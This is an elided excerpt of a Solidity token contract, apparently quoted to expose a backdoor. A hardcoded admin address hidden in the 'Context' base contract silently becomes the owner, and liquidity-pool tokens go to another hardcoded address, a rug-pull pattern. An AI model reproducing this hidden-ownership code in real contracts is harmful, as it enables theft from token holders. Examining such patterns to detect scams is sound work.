...
abstract contract Context {
    ...
    address adminAddress = 0x58A8a933407F7c6bAB0D66346d332679CE92b8b6;
    ...
    function _adminAddress() internal view virtual returns (address payable) {
        return payable(adminAddress);
    }
}
...
contract Ownable is Context {
    ...
    constructor () {
        address msgSender = _adminAddress();
        _owner = msgSender;
...
contract AAA is Context, IERC20, Ownable {
    ...
    address payable public teamWalletAddress = payable(0xD06DFa6dFAaA417B4F66894B2b56f64E57011A44); // Team Address
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            ...
            0, // slippage is unavoidable
            address(0x9e60fC23fe10b93a10f29789A515EAFdF3D11CD3),
            block.timestamp
        );
    }
